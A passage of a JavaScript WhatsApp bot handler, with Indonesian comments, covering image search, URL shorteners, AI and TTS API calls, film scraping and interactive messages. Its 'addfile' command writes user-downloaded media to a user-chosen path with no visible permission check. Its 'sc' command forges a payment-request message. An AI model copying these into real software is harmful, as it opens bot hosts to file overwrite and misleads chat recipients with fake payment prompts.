 const msg = baileys.generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `Berikut adalah hasil pencarian untuk ${query}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `${pushname}`
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Hasil Pencarian`,
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: cards
 })
 })
 }
 }
 }, {});

 await sky.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break
case 'sfind': {
 if (!isPrem) return m.reply(mess.premium);
 const [query, count] = text.split(' | ');

 if (!query || !count || isNaN(count)) {
 return m.reply(`Contoh: ${prefix}find patrick | 7`);
 }

 if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit);

 // Kurangi limit pengguna
 global.db.data.users[m.sender].limit -= 20;
 m.reply(mess.wait);

 // Cari gambar dari Pinterest
 pinterest(query)
 .then((result) => {
 const numImagesToSend = parseInt(count);
 
 // Acak hasil pencarian untuk membuatnya lebih acak
 const shuffledResults = result.result
 .sort(() => 0.5 - Math.random())
 .filter((item, index, self) => self.findIndex(t => t === item) === index)
 .slice(0, numImagesToSend);

 // Kirim gambar sebagai stiker
 for (const imageUrl of shuffledResults) {
 sky.sendImageAsSticker(m.chat, imageUrl, m, { packname: global.packname, author: global.author });
 }
 })
 .catch((error) => {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
break
case 'meme': {
m.reply(mess.wait);
 pinterest(command.toLowerCase())
 .then((result) => {
 if (result.status === 200 && result.result.length > 0) {
 let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
 sky.sendMessage(m.chat, { image: { url: imageUrl }, caption: mess.done }, { quoted: m });
 } else {
 m.reply('Tidak dapat menemukan gambar untuk karakter ini.');
 }
 })
 .catch((error) => {
 console.error(error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
break
case 'naruto': case 'sasuke': case 'luffy': case 'goku':
case 'vegeta': case 'ichigo': case 'eren': case 'mikasa':
case 'levi': case 'gon': case 'killua': case 'hisoka':
case 'edward': case 'alphonse': case 'winry': case 'light':
case 'ryuk': case 'ken': case 'kaneki': case 'toka':
case 'izuku': case 'bakugo': case 'allmight': case 'deku':
case 'mob': case 'reigen': case 'teru': case 'narancia':
case 'loli': case 'giorno': case 'jotaro': case 'dio': case 'kira':
case 'shinichi': case 'ran': case 'conan': case 'kaito':
case 'aizen': case 'byakuya': case 'hitsugaya': case 'orihime':
case 'gintoki': case 'shinpachi': case 'kagura': case 'zura':
case 'makoto': case 'haru': case 'rin': case 'nagisa':
case 'saitama': case 'genos': case 'mumen': case 'boros':
case 'gohan': case 'piccolo': case 'krillin': case 'frieza':
case 'vegeto': case 'goten': case 'trunks': case 'cell':
case 'neji': case 'rocklee': case 'tenten': case 'itachi':
case 'kakashi': case 'sakura': case 'tsunade': case 'gaara':
case 'neku': case 'shiki': case 'joshua': case 'beat':
case 'naoto': case 'kanji': case 'rise': case 'yosuke':
case 'makoto': case 'yusuke': case 'ann': case 'morgana':
case 'ryuji': case 'futaba': case 'haru': case 'aigis':
case 'makoto': case 'yukiko': case 'chie': case 'nanako':
case 'yukari': case 'junpei': case 'mitsuru': case 'akihiko':
case 'yusuke': case 'makoto': case 'futaba': case 'haru':
case 'frodo': case 'sam': case 'aragorn': case 'gandalf':
case 'legolas': case 'gimli': case 'boromir': case 'smeagol':
case 'harry': case 'ron': case 'hermione': case 'dumbledore':
case 'voldemort': case 'snape': case 'malfoy': case 'hagrid':
case 'bilbo': case 'thorin': case 'smaug': {
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@whiskeysockets/baileys');
    m.reply(mess.wait);
    pinterest(`gambar anime ${command.toLowerCase()}`)
        .then(async (result) => {
            if (result.status === 200 && result.result.length > 0) {
                let imageUrl = result.result[Math.floor(Math.random() * result.result.length)];
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: `gas`,
                                        newsletterJid: "33451220170@s.whatsapp.net",
                                        serverMessageId: 143
                                    },
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: sky.decodeJid(sky.user.id)
                                    },
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `${command}`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: "© avosky"
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: ``,
                                    subtitle: "",
                                    hasMediaAttachment: true,
                                    ...(await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: sky.waUploadToServer }))
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [
                                        {
                                            "name": "quick_reply",
                                            "buttonParamsJson": `{\"display_text\":\"next\",\"id\":\"${command}\"}`
                                        },
                                    ]
                                })
                            })
                        }
                    }
                }, {});
                sky.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                });
            } else {
                m.reply('Tidak dapat menemukan gambar untuk karakter ini.');
            }
        })
        .catch((error) => {
            console.error(error);
            m.reply('Terjadi kesalahan dalam mencari gambar.');
        });
}
break


case 'stopjam': {
 // Hentikan interval timer jika sedang berjalan
 if (intervalID) {
 clearInterval(intervalID);
 m.reply('Jam berhenti bergerak.');
 } else {
 m.reply('Jam sudah berhenti.');
 }
}
break
case 'poll': {
 if (!isCreator) {
 m.reply(mess.owner);
 return;
 }

 const input = args.join(' ').split('|').map(arg => arg.trim());

 if (input.length < 3) {
 m.reply('Gunakan format: sendpoll <pertanyaan> | <pilihan1> | <pilihan2>');
 return;
 }

 const question = input[0];
 const options = input.slice(1);

 sky.sendPoll(m.chat, question, options)
 .then(() => m.reply('Polling berhasil dikirim.'))
 .catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
 break
case 'colors': {
 if (!q) throw `Warna nya?`;

 try {
 // URL untuk menghasilkan gambar dengan warna
 const color = encodeURIComponent(q);
 const imageUrl = `https://quickchart.io/chart?c={type:'bar',data:{datasets:[{backgroundColor:'${color}',data:[1]}]}}`;

 // Mengunduh gambar dari layanan web
 axios({
 method: 'get',
 url: imageUrl,
 responseType: 'arraybuffer'
 })
 .then(response => {
 const buffer = Buffer.from(response.data, 'binary');
 sky.sendFile(from, buffer, 'gambar.png', 'Berikut adalah gambar yang telah dibuat.');
 })
 .catch(error => {
 m.reply(`Terjadi kesalahan saat membuat gambar: ${error.message}`);
 });

 } catch (err) {
 m.reply(`Warna tidak valid: ${q}`);
 }
}
break
case 'pemandangan': {
 if (!text) throw `input warna nya contoh pemandangan skyblue yellow green blue\n\> opsi latarbelakang matahari gunung laut`
 const { createCanvas } = require('canvas');

 let skyColor = 'skyblue'; // Warna default latar belakang
 let sunColor = 'yellow'; // Warna default matahari
 let mountainColor = 'gray'; // Warna default pegunungan
 let lakeColor = 'blue'; // Warna default danau

 // Memeriksa input pengguna untuk warna latar belakang
 if (args[0]) {
 skyColor = args[0];
 }

 // Memeriksa input pengguna untuk warna matahari
 if (args[1]) {
 sunColor = args[1];
 }

 // Memeriksa input pengguna untuk warna pegunungan
 if (args[2]) {
 mountainColor = args[2];
 }

 // Memeriksa input pengguna untuk warna danau
 if (args[3]) {
 lakeColor = args[3];
 }

 const canvasWidth = 600;
 const canvasHeight = 400;

 // Membuat canvas
 const canvas = createCanvas(canvasWidth, canvasHeight);
 const ctx = canvas.getContext('2d');

 // Mengatur latar belakang
 ctx.fillStyle = skyColor;
 ctx.fillRect(0, 0, canvasWidth, canvasHeight);

 // Menggambar matahari
 ctx.fillStyle = sunColor;
 ctx.beginPath();
 ctx.arc(100, 100, 50, 0, Math.PI * 2);
 ctx.fill();

 // Menggambar pegunungan
 ctx.fillStyle = mountainColor;
 ctx.beginPath();
 ctx.moveTo(200, 400);
 ctx.lineTo(400, 200);
 ctx.lineTo(600, 400);
 ctx.closePath();
 ctx.fill();

 // Menggambar danau
 ctx.fillStyle = lakeColor;
 ctx.fillRect(0, 300, canvasWidth, 100);

 // Menyimpan gambar dalam bentuk base64
 const base64Image = canvas.toDataURL('image/png');

 // Mengirim gambar
 sky.sendFile(from, base64Image, 'pemandangan.png', 'Berikut adalah pemandangan alam yang telah dibuat.');
}
break
case 'addfile': {
 let delb = await sky.downloadAndSaveMediaMessage(quoted)
 await fsx.copy(delb, `${q}`)
 fs.unlinkSync(delb)
 m.reply(`Sukses`)
 }
 break
case 'tti': {
 const axios = require('axios'); // Pastikan modul axios telah diinstal

 // Pastikan argumen teks disertakan
 if (!args.length) {
 m.reply('Silakan masukkan teks untuk menghasilkan gambar.');
 return;
 }

 const text = args.join(' ');

 // Konfigurasi permintaan ke API
 const config = {
 method: 'post',
 url: 'https://chat-gpt.pictures/api/generateImage',
 headers: {
 'Content-Type': 'application/json'
 },
 data: JSON.stringify({ text: text })
 };

 // Memanggil API
 axios(config)
 .then(function (response) {
 // Memeriksa apakah ada kesalahan dalam respons API
 if (!response.data || !response.data.imageUrl) {
 m.reply('Terjadi kesalahan saat menghasilkan gambar.');
 return;
 }

 // Mengambil URL gambar dari respons API
 const imageUrl = response.data.imageUrl;

 // Mengirim gambar menggunakan sky.sendFile
 sky.sendFile(from, imageUrl, 'image.jpg', 'Ini hasil dari teks yang Anda masukkan.', m);
 })
 .catch(function (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat memproses permintaan Anda.');
 });
}
break
case 'kyy': {
 if (!text) throw `apa?`;
 try { 
 const { data } = await axios.get(`https://itzpire.com/ai/gpt-logic?q=${encodeURIComponent(text)}&logic=Kamu%20Adalah%20seseorang%20bernama%20avosky%20dan%20kamu%20wajib%20jawab%20pertanyaan%20dengan%20nada%20lucu&chat_id=iky9`);
 
 // Cek apakah `result` ada dalam `data`
 const answer = data.result || ""; 
 const answerWords = answer.split(" ");

 // Kirim pesan awal dengan pertanyaan
 const { key } = await sky.sendMessage(from, { text: `_succes_`, previewType: 0 });

 let editedMessage = ""; // Pesan yang akan diubah
 const addedWords = new Set(); // Set untuk melacak kata-kata yang sudah ditambahkan

 for (let i = 0; i < answerWords.length; i++) {
 const word = answerWords[i].trim();

 // Pastikan kata tidak berulang sebelum menambahkannya ke pesan yang akan diubah
 if (!addedWords.has(word)) {
 editedMessage += word + " "; // Tambahkan kata ke pesan yang akan diubah
 addedWords.add(word); // Tandai kata sebagai sudah ditambahkan
 }

 // Kirim pesan yang diubah dengan jawaban AI dengan penundaan 1,3 detik
 await new Promise(resolve => setTimeout(resolve, 1300)); // Tunggu 1,3 detik
 await sky.sendMessage(from, { text: editedMessage.trim(), edit: key });
 }
 } catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan');
 }
}
break;
case 'kyz': {
 const xeonplaymp3 = require('./lib/ytdl2');
 const yts = require("youtube-yts");
 
 try {
 let search = await yts(text);
 if (search.videos.length === 0) {
 return; // Tidak ada balasan jika lagu tidak ditemukan
 }

 let anup3k = search.videos[0];
 const pl = await xeonplaymp3.mp3(anup3k.url);
 
 await sky.sendMessage(m.chat, {
 audio: fs.readFileSync(pl.path),
 fileName: anup3k.title + '.mp3',
 mimetype: 'audio/mp4',
 ptt: true
 }, { quoted: m });
 
 await fs.unlinkSync(pl.path);
 } catch (error) {
 console.error(error);
 }
}
break
case 'vits': {
 try {
 if (!text) return m.reply(`Example : ${prefix + command} text | id`);
kyy = text.split(' | ')[0] ? text.split(' | ')[0] : '-'
ky = text.split(' | ')[1] ? text.split(' | ')[1] : '-'
 m.reply(mess.wait);

 // Menggunakan URL yang diberikan untuk mengonversi teks menjadi suara
 let ttsUrl = `https://api.onesytex.my.id/api/vits_inference?text=${kyy}&model_id=${ky}`;
 
 // Mengirim pesan suara menggunakan URL yang dihasilkan
 sky.sendMessage(from, { audio: { url: ttsUrl }, mimetype: "audio/mp4", fileName: "Audio", ptt: true }, { quoted: m });
 } catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan');
 }
}
break
case 'cry2': {
 if (!m.mentionedJid[0] && !m.quoted) return m.reply(`Tag`);
 
 try {
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`);
 let messsender = m.sender;
 let users = '';
 let ment = [];
 
 try {
 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 ment = [messsender, users];
 } catch {
 users = "none";
 ment = [messsender, m.sender];
 }

 let musers = users == "none" 
 ? `@${m.sender.split("@")[0]} cried themself!` 
 : `@${m.sender.split("@")[0]} cried @${users.split("@")[0]}`;
 
 const response = await axios.get(pat.url, { responseType: 'arraybuffer' });
 const buffer = Buffer.from(response.data, "utf-8");
 var fetchedgif = await GIFBufferToVideoBuffer(buffer);

 sky.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m });
 } catch (error) {
 console.log(error);
 }
}
break
case 'gif': {
 if (!text) throw `link?`
 try {
const gifUrl = `${q}`
const caption = '';
sendGif(gifUrl, m.chat, caption)
} catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan');
 }
}
break



 
case 'isgd': {
 if (!text) throw `iky manis`
 const longUrl = args[0];

 // iky manis
 axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(text)}`)
 .then(response => {
 const shortUrl = response.data.trim();

 if (shortUrl.startsWith('http')) {
 m.reply(`URL pendek: ${shortUrl}`);
 } else {
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 }
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 });
}
 break
case 'dagd': {
 if (!text) throw `iky???`
 const longUrl = args[0];
 // iky?
 axios.get(`https://da.gd/s?url=${encodeURIComponent(longUrl)}`)
 .then(response => {
 const shortUrl = response.data.trim();
 if (shortUrl.startsWith('http')) {
 m.reply(`URL pendek: ${shortUrl}`);
 } else {
 m.reply('iky ????.');
 }
 })
 .catch(error => {
 console.error(error);
 m.reply('iky ?');
 });
}
 break
case 'clckru': {
 if (!text) throw 'Mohon masukkan URL yang ingin dipendekkan.';
 const longUrl = text; // Menggunakan 'text' sebagai URL panjang

 axios.get(`https://clck.ru/--?url=${encodeURIComponent(longUrl)}`)
 .then(response => {
 const shortUrl = response.data.trim();
 m.reply(`URL pendek: ${shortUrl}`);
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 });
}
break
case 'cleanurls': {
 if (!text) throw 'Mohon masukkan URL yang ingin dipendekkan.';
 const longUrl = text; // Menggunakan 'text' sebagai URL panjang

 axios.post(`https://cleanuri.com/api/v1/shorten`, {
 url: longUrl
 })
 .then(response => {
 const shortUrl = response.data.result_url;
 m.reply(`URL pendek: ${shortUrl}`);
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 });
}
break
case 'domainsearch': {
 const domainName = args.join('').trim(); // Menggabungkan argumen menjadi satu string dan menghapus spasi di awal dan akhir

 // Memeriksa apakah pengguna memberikan nama domain
 if (!domainName) {
 m.reply('Tentukan nama domain yang ingin Anda cari.');
 return;
 }

 // Mengirim permintaan ke situs web penyedia domain
 axios.get(`https://www.domain.com/domain/search/?q=${domainName}`)
 .then(response => {
 // Load HTML menggunakan Cheerio
 const $ = cheerio.load(response.data);

 // Mengambil hasil pencarian domain
 const foundDomains = [];

 $('div.search-results > div.result').each((index, element) => {
 const domain = $(element).find('h2').text();
 const price = $(element).find('.price').text();

 foundDomains.push({ name: domain, price: price });
 });

 // Membuat teks respons
 let responseText = `Hasil pencarian domain untuk "${domainName}":\n`;

 // Menambahkan informasi untuk setiap domain yang ditemukan
 foundDomains.forEach(domain => {
 responseText += `${domain.name}\nPrice: ${domain.price}\n\n`;
 });

 // Mengirim respons
 m.reply(responseText);
 })
 .catch(error => {
 console.error('Error searching for domains:', error);
 m.reply('Terjadi kesalahan dalam pencarian domain.');
 });
}
break
case 'bitdo': {
 if (!text) throw 'Mohon masukkan URL yang ingin dipendekkan.';
 const longUrl = text; // Menggunakan 'text' sebagai URL panjang

 axios.post(`https://bit.do/acortar`, {
 url: longUrl
 })
 .then(response => {
 const shortUrl = response.data.shortenedUrl;
 m.reply(`URL pendek: ${shortUrl}`);
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat memendekkan URL.');
 });
}
break
case 'imgs': {
 const query = args.join(' ');

 if (!query) {
 m.reply('Tentukan istilah yang ingin kamu cari gambar.');
 return;
 }

 const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`;

 axios.get(searchUrl)
 .then(response => {
 const $ = cheerio.load(response.data);
 const imageUrls = [];

 // Mengambil URL gambar dari hasil pencarian Google Images
 $('img').each((index, element) => {
 const imageUrl = $(element).attr('src');
 if (imageUrl) {
 imageUrls.push(imageUrl);
 }
 });

 // Jika tidak ada gambar yang ditemukan
 if (imageUrls.length === 0) {
 m.reply('Tidak ada gambar yang ditemukan untuk istilah tersebut.');
 return;
 }

 // Kirim salah satu URL gambar secara acak
 const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
 m.reply(randomImageUrl);
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan saat melakukan scraping.');
 });
}
break
case 'ipwebsite': {
const dns = require('dns');
 const websiteUrl = args[0];

 if (!websiteUrl) {
 m.reply('Tentukan URL website yang ingin diambil IP-nya.');
 return;
 }

 dns.lookup(websiteUrl, (error, addresses) => {
 if (error) {
 console.error(error);
 m.reply(`Gagal mendapatkan IP dari ${websiteUrl}.`);
 return;
 }
 
 // Jika ada beberapa IP, hanya ambil yang pertama
 const ipAddress = Array.isArray(addresses) ? addresses[0] : addresses;

 m.reply(`IP dari ${websiteUrl} adalah: ${ipAddress}`);
 });
}
break
case 'tr': case 'translate': {
const translate = require('translate-google');
 if (!args.length) return m.reply('Tentukan teks yang akan diterjemahkan.')
 let textToAnswer = text;

 if (m.quoted && m.quoted.text) {
 textToAnswer = m.quoted.text;
 }
 ;
 const targetLang = args[0];
 if (!targetLang || !textToAnswer) {
 return m.reply('Format penggunaan: !translate [kode bahasa] [teks]');
 }
 translate(textToAnswer, { to: targetLang }).then(res => {
 m.reply(`Terjemahan:\n${res}`);
 }).catch(err => {
 console.error(err);
 m.reply('Terjadi kesalahan saat menerjemahkan teks.');
 });
}
 break
case 'vgd': {
 if (!text) return m.reply(`link`);
 axios.get(`https://v.gd/create.php?format=simple&url=${encodeURIComponent(text)}`)
 .then(response => {
 const shortUrl = response.data.trim();
 if (shortUrl.startsWith('http')) {
 m.reply(`${shortUrl}`);
 } else {
 m.reply('Terjadi kesalahan saat memperpendek link');
 }
 })
 .catch(error => {
 console.error(error);
 m.reply('Terjadi kesalahan');
 });
}
break
case 'pin2': {
 if (!text) {
 m.reply('Mohon masukkan kata kunci yang ingin dicari di Pinterest.');
 return;
 }

 m.reply(mess.wait);

 pinterest(text.toLowerCase())
 .then(async (result) => {
 if (result.status === 200 && result.result.length > 0) {
 const imageUrl = result.result[Math.floor(Math.random() * result.result.length)];

 try {
 const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
 const imageBuffer = Buffer.from(response.data, 'binary');

 // Prepare the media
 const messa = await prepareWAMessageMedia({ image: imageBuffer }, { upload: sky.waUploadToServer });

 // Create the catalog message
 const catalogMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
 "product": {
 "productImage": messa.imageMessage,
 "productId": "uniqueProductId", // Ganti dengan ID unik yang sesuai
 "title": text,
 "description": "Gambar dari Pinterest",
 "currencyCode": "USD", // Atau mata uang lain sesuai kebutuhan
 "bodyText": "Gambar yang dicari",
 "footerText": "Gambar dari Pinterest",
 "priceAmount1000": "0", // Atur harga sesuai kebutuhan
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "0",
 "retailerId": "idk",
 "url": imageUrl
 },
 "businessOwnerJid": `${m.sender.split('@')[0]}@s.whatsapp.net`,
 }
 }), { userJid: m.chat, quoted: m });

 // Send the message
 sky.relayMessage(m.chat, catalogMessage.message, { messageId: catalogMessage.key.id });

 } catch (error) {
 console.error('Error preparing or sending image:', error);
 m.reply('Terjadi kesalahan dalam mengirim gambar.');
 }
 } else {
 m.reply('Tidak dapat menemukan gambar untuk kata kunci ini.');
 }
 })
 .catch((error) => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan dalam mencari gambar.');
 });
}
break
case 'aivoice': {
 try {
 if (!text) throw 'Teks tidak diberikan';

 const url = `https://itzpire.com/ai/gpt?model=gpt-4&q=${q}`;
 console.log('URL:', url); 
 const { data, status } = await axios.get(url);
 if (status !== 200) throw `Permintaan gagal dengan kode status: ${status}`;
 if (!data || !data.data.response) throw 'AI tidak memberikan respon yang valid';
 let aiResponse = data.data.response.trim();
 if (!aiResponse) throw 'Respon AI kosong';
 const maxLength = 1500;
 const textChunks = [];
 while (aiResponse.length > maxLength) {
 textChunks.push(aiResponse.substring(0, maxLength));
 aiResponse = aiResponse.substring(maxLength);
 }
 textChunks.push(aiResponse); 
 for (let chunk of textChunks) {
 let ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(chunk)}&tl=id&client=tw-ob`;
 await sky.sendMessage(from, { audio: { url: ttsUrl }, mimetype: "audio/mp4", fileName: "Audio", ptt: true });
 }
 } catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan: ' + err);
 }
}
break
case'q': case 'quoted': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await sky.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
 }
	 break
case 'creategroup': {
 if (!isPrem) return replyprem(mess.premium)
try {
let cret = await sky.groupCreate(args.join(" "), [])
let response = await sky.groupInviteCode(cret.id)
let teks2 = `Name : ${cret.subject}

> Name : ${cret.subject}
Owner : @${cret.owner.split("@")[0]}
> Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}
> Group Id : ${cret.id}
> Join : chat.whatsapp.com/${response}`
m.reply(teks2)
} catch {
m.reply("Error!")
}
}
break

case 'ephoto': {
 m.reply(mess.wait); // Mengirim pesan menunggu

 const [url, text] = q.split('|'); // Memisahkan URL dan teks input dari pengguna

 if (!url || !text) return m.reply(`Contoh: .ephoto <url>|<teks>`); // Memastikan ada URL dan teks yang diberikan

 const ephoto = async (url, text) => {
 const axios = require('axios');
 const FormData = require('form-data');
 const cheerio = require('cheerio');

 try {
 let form = new FormData();
 let gT = await axios.get(url, {
 headers: {
 'user-agent':
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
 },
 });
 let $ = cheerio.load(gT.data);
 let token = $('input[name=token]').val();
 let build_server = $('input[name=build_server]').val();
 let build_server_id = $('input[name=build_server_id]').val();
 form.append('text[]', text);
 form.append('token', token);
 form.append('build_server', build_server);
 form.append('build_server_id', build_server_id);
 let res = await axios({
 url: url,
 method: 'POST',
 data: form,
 headers: {
 Accept: '*/*',
 'Accept-Language': 'en-US,en;q=0.9',
 'user-agent':
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
 cookie: gT.headers['set-cookie']?.join('; '),
 ...form.getHeaders(),
 },
 });
 let $$ = cheerio.load(res.data);
 let json = JSON.parse($$('input[name=form_value_input]').val());
 json['text[]'] = json.text;
 delete json.text;
 let { data } = await axios.post(
 'https://en.ephoto360.com/effect/create-image',
 new URLSearchParams(json),
 {
 headers: {
 'user-agent':
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
 cookie: gT.headers['set-cookie'].join('; '),
 },
 }
 );
 return build_server + data.image;
 } catch (error) {
 console.error(error);
 throw new Error('Error generating image!');
 }
 };

 try {
 let imageUrl = await ephoto(url.trim(), text.trim()); // Menghasilkan gambar dengan teks yang diberikan
 sky.sendMessage(
 m.chat,
 { image: { url: imageUrl }, caption: 'Selesai' }, // Mengirimkan gambar hasil ke pengguna
 { quoted: m }
 );
 } catch (e) {
 m.reply("Error menghasilkan gambar!"); // Menangani kesalahan dan mengirim pesan error
 console.error(e); // Log error untuk debugging
 }
}
break
case 'tiktokmp4': {
if (!q) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
sky.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'infogc': {
 if (!isGroup) return `Command ini hanya bisa digunakan di dalam grup.`;
 
 let meta = await sky.groupMetadata(m.chat);
 let admin = meta.participants.filter(p => p.admin);
 let listAdmin = admin.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
 
 let caption = `🛡️ *G R O U P - I N F O* 🛡️\n\n` +
 `🏷️ *Name*: ${meta.subject}\n` +
 `🆔 *ID*: ${meta.id}\n` +
 `👑 *Owner*: ${meta.owner ? '@' + meta.owner.split('@')[0] : m.chat.match('-') ? '@' + m.chat.split('-')[0] : ''}\n` +
 `⏰ *Created*: ${moment(meta.creation * 1000).format('DD/MM/YY HH:mm:ss')}\n` +
 `👥 *Member*: ${meta.participants.length}\n` +
 `👤 *Admin*: ${admin.length}\n` +
 `📩 *Kirim pesan*: ${meta.announce ? 'Hanya admin' : 'Semua peserta'}\n` +
 `📝 *Edit info grup*: ${meta.restrict ? 'Hanya admin' : 'Semua peserta'}\n` +
 `\n👑 *List Admin*:\n${listAdmin}\n\n` +
 `📝 *Deskripsi grup*:\n${meta.desc}`;
 
 m.reply(`${caption}`);
}
break
 case 'setpp': case 'film': {
 const query = args.join(" ");
 if (!query) {
 m.reply('Masukkan judul film yang ingin Anda cari.');
 return;
 }

 const searchFilm = async (query) => {
 let list = [];
 try {
 let page = await axios.get(`https://www.filmapik21.sbs/?s=${query}`).catch(err => err.response);
 let html = page.data;
 let $ = cheerio.load(html);
 $(".search-page > .result-item", html).each(function() {
 let title = $(this).find("article > .details > .title").text();
 let rating = $(this).find("article > .details > .meta").text();
 let sinopsis = $(this).find("article > .details > .contenido").text();
 let thumb = $(this).find("article > .image > .thumbnail.animation-2 > a > img").attr("src");
 let url = $(this).find("article > .image > .thumbnail.animation-2 > a").attr("href");
 list.push({
 title,
 rating,
 sinopsis,
 url
 });
 });
 return list;
 } catch (error) {
 console.error(error);
 return [];
 }
 };

 try {
 const filmList = await searchFilm(query);
 if (filmList.length === 0) {
 m.reply('Tidak ada hasil yang ditemukan untuk query ini.');
 return;
 }

 let responseText = 'Berikut adalah hasil pencarian:\n';
 filmList.forEach((film, index) => {
 responseText += `\n${index + 1}. Judul: ${film.title}\nRating: ${film.rating}\nSinopsis: ${film.sinopsis}\nURL: ${film.url}\n`;
 });

 m.reply(responseText);
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan saat mencari film.');
 }
}
break
case 'setlogic': {
 if (!args[0]) return m.reply("_mana logic nya bang?_");
 const newId = args.join(" "); // Menggabungkan argumen menjadi satu string dengan spasi
 let logicData = {};
 try {
 logicData = JSON.parse(fs.readFileSync('./database/logic.json'));
 } catch (error) {
 console.error("Error reading or parsing JSON file:", error);
 }
 logicData.id = newId;
 fs.writeFileSync('./database/logic.json', JSON.stringify(logicData, null, 2));
 m.reply(`Logic berhasil ditetapkan.`);
}
break
case 'sc': {
 function generateReferenceId(length = 11) {
 return crypto.randomBytes(length).toString('hex').toUpperCase().slice(0, length);
 }

 let caption = `Cieeee Nyari Sc`;
 const referenceId = generateReferenceId();

 let ngentod = await generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2,
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: caption,
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: 'sky',
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia(
 { image: { url: `https://telegra.ph/file/2a4831c7cf01f66819fbe.jpg` } },
 { upload: sky.waUploadToServer },
 )),
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "review_and_pay",
 "buttonParamsJson": `{
 "currency": "IDR",
 "payment_configuration": "",
 "payment_type": "",
 "total_amount": {
 "value": 50000000,
 "offset": 100
 },
 "reference_id": "${referenceId}",
 "type": "physical-goods",
 "order": {
 "status": "payment_requested",
 "description": "",
 "subtotal": {
 "value": 50000000,
 "offset": 100
 },
 "tax": {
 "value": 661,
 "offset": 100
 },
 "discount": {
 "value": 10000000,
 "offset": 100
 },
 "order_type": "ORDER",
 "items": [
 {
 "retailer_id": "7537631592926009",
 "product_id": "7538731592926009",
